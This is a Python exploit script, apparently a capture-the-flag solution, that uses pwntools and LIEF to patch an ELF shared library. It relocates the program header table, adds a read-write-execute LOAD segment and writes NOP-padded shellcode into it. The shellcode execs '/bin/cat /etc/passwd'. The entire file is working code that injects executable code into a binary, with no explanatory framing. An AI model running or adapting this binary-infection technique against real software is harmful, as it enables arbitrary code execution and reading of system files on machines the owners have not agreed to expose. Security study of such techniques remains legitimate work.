#!/usr/bin/env python3
import lief
import struct
import os
import sys

from pwn import *
context(os = 'linux', arch = 'amd64', log_level = 'debug')

'''
typedef struct elf64_phdr {
  Elf64_Word p_type;
  Elf64_Word p_flags;
  Elf64_Off p_offset;		/* Segment file offset */
  Elf64_Addr p_vaddr;		/* Segment virtual address */
  Elf64_Addr p_paddr;		/* Segment physical address */
  Elf64_Xword p_filesz;		/* Segment size in file */
  Elf64_Xword p_memsz;		/* Segment size in memory */
  Elf64_Xword p_align;		/* Segment alignment, file & memory */
} Elf64_Phdr;
'''
program_table_entry64_t = struct.Struct('<LLQQQQQQ')

def main():
    shellasm  = shellcraft.pushstr_array('rsi', ['cat', '/etc/passwd'])
    shellasm += shellcraft.pushstr('/bin/cat')
    shellasm += shellcraft.syscall('SYS_execve', 'rsp', None, 0)
    shellcode = asm(shellasm)

    exploit(sys.argv[1] if len(sys.argv)>1 else 'libvoid.so', shellcode, 0x20000)

def exploit(filename, data, size):
    binary = lief.parse(filename)
    header = binary.header

    ofs_ph       = header.program_header_offset
    size_ph      = header.program_header_size * header.numberof_segments

    ofs_newph    = (binary.eof_offset + 0xf) & ~0xf
    ofs_add      = (ofs_newph + size_ph + header.program_header_size * 2 + (1<<12)-1) & ~((1<<12)-1)

    header.program_header_offset = ofs_newph
    header.numberof_segments += 2
    binary.write(f'{filename}.mod')

    fd = os.open(f'{filename}.mod', os.O_RDWR)
    os.lseek(fd, ofs_ph, os.SEEK_SET)

    ptable  = os.read(fd, size_ph)
    ptable += program_table_entry64_t.pack(
            lief.ELF.SEGMENT_TYPES.LOAD, lief.ELF.SEGMENT_FLAGS.R|lief.ELF.SEGMENT_FLAGS.W|lief.ELF.SEGMENT_FLAGS.X,
            ofs_add, 0x2b8000, 0, size, size, 0x1000)
    ptable += program_table_entry64_t.pack(lief.ELF.SEGMENT_TYPES.LOAD, 0, 0, 0x100000, 0, 0, 0x1b8000, 0x100000)

    os.lseek(fd, ofs_newph, os.SEEK_SET)
    os.write(fd, ptable)
    os.lseek(fd, ofs_add, os.SEEK_SET)
    os.write(fd, data.rjust(size, b'\x90'))
    os.close(fd)

if __name__ == '__main__':
    main()


